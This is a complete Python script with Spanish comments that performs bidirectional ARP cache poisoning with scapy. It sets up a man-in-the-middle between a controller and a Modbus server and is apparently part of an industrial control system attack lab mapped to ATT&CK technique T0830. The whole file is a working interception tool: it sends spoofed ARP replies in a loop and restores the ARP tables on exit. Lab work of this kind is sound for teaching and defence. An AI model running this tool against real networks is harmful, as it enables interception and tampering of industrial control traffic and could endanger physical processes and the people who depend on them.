#!/usr/bin/env python3
"""
ARP spoofing / ARP cache poisoning  --  parte 1 del T0830 (Adversary-in-the-Middle).

Envenena las tablas ARP del CONTROLADOR y del SERVIDOR Modbus para que todo su
trafico pase por esta maquina (el atacante). Las victimas siguen usando las
MISMAS IPs: no se toca su configuracion, es un MITM real de capa 2.

Requiere:
  - root
  - IP forwarding activo:  sysctl -w net.ipv4.ip_forward=1  (lo hace setup_atacante.sh)
  - estar en la misma LAN/segmento L2 que las victimas (VMs en red interna)

Uso:
    sudo python3 arp_spoof.py --controller-ip <IP_CTRL> --server-ip <IP_SERVIDOR> [--iface eth0]

Al pulsar Ctrl+C restaura las tablas ARP para dejar la red limpia.
"""
import argparse
import sys
import time

from scapy.all import ARP, conf, get_if_hwaddr, getmacbyip, send


def mac_de(ip):
    mac = getmacbyip(ip)
    if mac is None:
        sys.exit(f"[ARP] No se pudo resolver la MAC de {ip}. "
                 f"Comprueba que esta encendida y en la misma red.")
    return mac


def envenenar(victima_ip, victima_mac, suplantada_ip, iface):
    """Le dice a 'victima' que 'suplantada_ip' esta en NUESTRA MAC."""
    # op=2 (is-at). psrc = la IP que suplantamos; hwsrc por defecto = nuestra MAC.
    send(ARP(op=2, pdst=victima_ip, hwdst=victima_mac, psrc=suplantada_ip),
         iface=iface, verbose=0)


def restaurar(victima_ip, victima_mac, real_ip, real_mac, iface):
    """Reanuncia la asociacion IP->MAC correcta para reparar las tablas ARP."""
    send(ARP(op=2, pdst=victima_ip, hwdst=victima_mac, psrc=real_ip, hwsrc=real_mac),
         iface=iface, count=5, verbose=0)


def main():
    parser = argparse.ArgumentParser(description="ARP spoofing bidireccional (T0830)")
    parser.add_argument("--controller-ip", required=True, help="IP de la VM controlador")
    parser.add_argument("--server-ip", required=True, help="IP de la VM servidor Modbus")
    parser.add_argument("--iface", default=conf.iface, help="interfaz de red (def: auto)")
    parser.add_argument("--intervalo", type=float, default=2.0,
                        help="segundos entre reenvios de ARP falso")
    args = parser.parse_args()

    ctrl_ip, srv_ip, iface = args.controller_ip, args.server_ip, args.iface
    print(f"[ARP] Interfaz {iface}  MAC atacante {get_if_hwaddr(iface)}")
    ctrl_mac = mac_de(ctrl_ip)
    srv_mac = mac_de(srv_ip)
    print(f"[ARP] Controlador {ctrl_ip} -> {ctrl_mac}")
    print(f"[ARP] Servidor    {srv_ip} -> {srv_mac}")
    print("[ARP] Envenenando... (Ctrl+C para parar y restaurar)")

    try:
        while True:
            # El controlador creera que el servidor esta en nuestra MAC...
            envenenar(ctrl_ip, ctrl_mac, srv_ip, iface)
            # ...y el servidor creera que el controlador esta en nuestra MAC.
            envenenar(srv_ip, srv_mac, ctrl_ip, iface)
            time.sleep(args.intervalo)
    except KeyboardInterrupt:
        print("\n[ARP] Restaurando tablas ARP...")
        restaurar(ctrl_ip, ctrl_mac, srv_ip, srv_mac, iface)
        restaurar(srv_ip, srv_mac, ctrl_ip, ctrl_mac, iface)
        print("[ARP] Hecho.")


if __name__ == "__main__":
    main()
